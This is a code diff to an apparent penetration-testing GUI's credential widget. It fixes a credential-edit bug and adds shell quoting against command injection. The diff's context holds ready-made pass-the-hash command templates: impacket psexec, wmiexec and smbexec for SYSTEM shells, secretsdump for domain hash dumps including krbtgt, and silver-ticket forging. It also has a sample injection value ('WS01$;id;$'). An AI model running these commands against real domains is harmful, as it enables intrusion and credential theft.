@@ -1115,21 +1115,38 @@ class CredentialStoreWidget(ctk.CTkFrame):
             fields["pass"] = pass_e
 
         def _save():
-            if not self.app.session_manager.current:
+            sess = self.app.session_manager.current
+            if not sess:
                 return
-            creds = self.app.session_manager.current.get_credentials()
-            if idx < len(creds):
-                creds[idx].username = fields["user"].get().strip()
-                creds[idx].services = [s.strip() for s in fields["svc"].get().split(",") if s.strip()]
+            # Must mutate sess.credentials directly — get_credentials()
+            # rebuilds a fresh list of Credential objects on every call,
+            # so assigning on those objects never reached the session
+            # and save() re-serialised the untouched dicts: the dialog
+            # said "Credential updated" and nothing changed.  Same class
+            # as the DELETE bug documented in Session.delete_credential.
+            ok = 0 <= idx < len(sess.credentials)
+            if ok:
+                entry = sess.credentials[idx]
+                entry["username"] = fields["user"].get().strip()
+                entry["services"] = [
+                    s.strip() for s in fields["svc"].get().split(",")
+                    if s.strip()]
                 if is_hash:
-                    creds[idx].hash_val  = fields["hash"].get().strip()
-                    creds[idx].hash_type = ht_var.get()
+                    entry["hash_val"]  = fields["hash"].get().strip()
+                    entry["hash_type"] = ht_var.get()
                 else:
-                    creds[idx].password = fields["pass"].get().strip()
-                self.app.session_manager.current.save()
+                    entry["password"] = fields["pass"].get().strip()
+                sess._touch()
+                sess.save()
             _safe_destroy(win)
             self.refresh()
-            self.app.terminal.write("  [+] Credential updated.", "success")
+            if ok:
+                self.app.terminal.write("  [+] Credential updated.",
+                                        "success")
+            else:
+                self.app.terminal.write(
+                    f"  [!] Edit failed: index {idx} out of range.",
+                    "warn")
 
         r = _btn_row(win)
         _btn(r, "SAVE", _save, primary=True)
@@ -1518,6 +1535,12 @@ class CredentialStoreWidget(ctk.CTkFrame):
                                    _btn, _title, _sub, _note_box)
         from utils.runner import _open_terminal
 
+        # Every value below (hash, sAMAccountName, domain) comes from
+        # the target's own output and lands in a `bash -c` line, so
+        # each one goes through shlex.quote.  A machine account named
+        # `WS01$;id;$` would otherwise run whatever it wants.
+        _q = shlex.quote
+
         # Extract the NTLM half from a potential "LM:NTLM" string —
         # impacket's `-hashes` flag wants the full `LMHASH:NTLMHASH`
         # form, so we pass hash_val verbatim when it's already in
@@ -1668,11 +1691,19 @@ class CredentialStoreWidget(ctk.CTkFrame):
         _section("PASS-THE-HASH  —  authenticate as this machine",
                  COLORS["text_cyan"])
 
+        # Pre-quoted fragments shared by the impacket action rows.
+        q_hashes = _q(hashes_arg)
+        q_nthash = _q(hashes_arg.split(":")[-1])
+        q_dom_user_target = _q(f"{target_domain}/{username}@{target}")
+        machine_fqdn = f"{machine_name}.{target_domain}"
+        q_cifs_spn = _q(f"CIFS/{machine_fqdn}")
+        q_admin_target = _q(f"{target_domain}/Administrator@{machine_fqdn}")
+
         _action_row(
             "psexec",
             f"psexec {machine_name}@{target}",
-            f"impacket-psexec -hashes {hashes_arg} "
-            f"'{target_domain}/{username}@{target}'; "
+            f"impacket-psexec -hashes {q_hashes} "
+            f"{q_dom_user_target}; "
             "read -p 'ENTER to close...'",
             "SYSTEM shell via Service Control Manager.  Loud but "
             "reliable — creates a Windows service called RemComSvc.")
@@ -1680,8 +1711,8 @@ class CredentialStoreWidget(ctk.CTkFrame):
         _action_row(
             "wmiexec",
             f"wmiexec {machine_name}@{target}",
-            f"impacket-wmiexec -hashes {hashes_arg} "
-            f"'{target_domain}/{username}@{target}'; "
+            f"impacket-wmiexec -hashes {q_hashes} "
+            f"{q_dom_user_target}; "
             "read -p 'ENTER to close...'",
             "Stealthier alternative — uses WMI instead of SCM, "
             "no service created.  Output is semi-interactive.")
@@ -1689,8 +1720,8 @@ class CredentialStoreWidget(ctk.CTkFrame):
         _action_row(
             "smbexec",
             f"smbexec {machine_name}@{target}",
-            f"impacket-smbexec -hashes {hashes_arg} "
-            f"'{target_domain}/{username}@{target}'; "
+            f"impacket-smbexec -hashes {q_hashes} "
+            f"{q_dom_user_target}; "
             "read -p 'ENTER to close...'",
             "Semi-interactive shell via SMB named pipes.  Middle "
             "ground — no service, but slightly less stealthy than "
@@ -1699,9 +1730,9 @@ class CredentialStoreWidget(ctk.CTkFrame):
         _action_row(
             "netexec check",
             f"nxc smb {target} (PtH check)",
-            f"netexec smb {target} -u '{username}' "
-            f"-H {hashes_arg.split(':')[-1]} "
-            f"-d '{target_domain}'; "
+            f"netexec smb {_q(target)} -u {_q(username)} "
+            f"-H {q_nthash} "
+            f"-d {_q(target_domain)}; "
             "read -p 'ENTER to close...'",
             "Quick PtH-works? check.  No shell, just tells you if "
             "the hash authenticates to SMB.  Do this FIRST before "
@@ -1714,8 +1745,8 @@ class CredentialStoreWidget(ctk.CTkFrame):
         _action_row(
             "secretsdump (full)",
             f"secretsdump {machine_name}@{target}",
-            f"impacket-secretsdump -hashes {hashes_arg} "
-            f"'{target_domain}/{username}@{target}'; "
+            f"impacket-secretsdump -hashes {q_hashes} "
+            f"{q_dom_user_target}; "
             "read -p 'ENTER to close...'",
             "Full SAM + LSA + DCSync dump.  If target is a DC, you "
             "get every domain user's NTLM hash including krbtgt "
@@ -1725,8 +1756,8 @@ class CredentialStoreWidget(ctk.CTkFrame):
         _action_row(
             "secretsdump -just-dc",
             f"secretsdump -just-dc {machine_name}@{target}",
-            f"impacket-secretsdump -hashes {hashes_arg} "
-            f"-just-dc '{target_domain}/{username}@{target}'; "
+            f"impacket-secretsdump -hashes {q_hashes} "
+            f"-just-dc {q_dom_user_target}; "
             "read -p 'ENTER to close...'",
             "Faster — skips the local SAM/LSA dump and only "
             "replicates the domain database.  Use when you KNOW "
@@ -1742,15 +1773,14 @@ class CredentialStoreWidget(ctk.CTkFrame):
             "ticketer (template)",
             f"ticketer silver {machine_name}",
             f"impacket-ticketer -nthash "
-            f"{hashes_arg.split(':')[-1]} "
+            f"{q_nthash} "
             f"-domain-sid '<S-1-5-21-XXX-XXX-XXX>' "
-            f"-domain '{target_domain}' "
-            f"-spn 'CIFS/{machine_name}.{target_domain}' "
+            f"-domain {_q(target_domain)} "
+            f"-spn {q_cifs_spn} "
             f"Administrator && "
             f"export KRB5CCNAME=Administrator.ccache && "
             f"impacket-psexec -k -no-pass "
-            f"'{target_domain}/Administrator@"
-            f"{machine_name}.{target_domain}'; "
+            f"{q_admin_target}; "
             "read -p 'ENTER to close...'",
             "Forges a service ticket as Administrator for CIFS on "
             "this machine.  Needs the domain SID — get it from "
@@ -1764,9 +1794,9 @@ class CredentialStoreWidget(ctk.CTkFrame):
         _action_row(
             "zerologon check",
             f"zerologon-check {machine_name}",
-            f"impacket-netview -d {target_domain} "
-            f"-u '{username}' -hashes {hashes_arg} "
-            f"--computer {machine_name} {target} || "
+            f"impacket-netview -d {_q(target_domain)} "
+            f"-u {_q(username)} -hashes {q_hashes} "
+            f"--computer {_q(machine_name)} {_q(target)} || "
             f"python3 -c \"print('Use a dedicated CVE-2020-1472 "
             f"tester — e.g. "
             f"github.com/SecuraBV/CVE-2020-1472')\"; "
@@ -2306,6 +2336,10 @@ class CredentialStoreWidget(ctk.CTkFrame):
         MASK strategy."""
         from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                   _btn_row, _btn, _safe_destroy)
+        # Not a module-level import: this widget never imported it, so
+        # the MASK dialog died with NameError halfway through building
+        # itself.
+        from utils.clipboard import add_context_menu
 
         win = _make_win(self, "MASK — pick a pattern", 620, 420)
         _title(win, "⛏  MASK attack — pattern")
